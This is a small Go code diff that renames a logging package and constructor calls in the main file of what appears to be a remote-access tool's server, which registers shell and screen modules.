@@ -13,7 +13,7 @@ import (
 	"server/internal/mod/screen"
 	"server/internal/mod/shell"
 	"server/internal/rat"
-	"server/internal/utility"
+	"server/internal/utility/asynlog"
 )
 
 const (
@@ -30,8 +30,8 @@ func main() {
 		return
 	}
 
-	logger := utility.NewLogQue(os.Stdout, time.Stamp)
-	rat := rat.NewRAT(logger)
+	logger := asynlog.New(os.Stdout, time.Stamp)
+	rat := rat.New(logger)
 	err := rat.Register(shell.New(logger))
 	if err != nil {
 		logger.Panic(err)
